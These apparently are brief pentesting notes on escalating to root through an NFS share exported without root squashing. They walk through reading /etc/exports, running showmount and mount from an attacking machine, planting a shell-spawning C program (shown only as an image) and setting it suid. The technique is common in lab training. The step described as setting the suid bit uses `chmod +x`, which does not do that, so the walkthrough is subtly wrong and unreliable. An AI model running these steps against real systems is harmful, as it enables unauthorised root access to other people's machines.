- Check for root squash with:
```
cat /etc/exports
```
- If some dir says no root squash (say /tmp), we can mount to it and use it as root remotely.
- Go to attacking machine and do:
```
showmount -e <box-ip>
```
- This shows dirs you can mount.
- Mount command:
```
mount -o rw,vers=2 <box-ip>:/tmp /tmp/mountme
```
- Now we put a malicious c script that spawns a shell
![image](https://user-images.githubusercontent.com/64409788/209692704-3e6c9189-0ad6-414c-a1b7-e3d89d244cab.png)
- When compiled, its actually compiled via root (since root is not squashed)
- Then we set the suid bit on it. `chmod +x /tmp/mountme/x`.
- Going back to box, we can execute it and gain root privs.
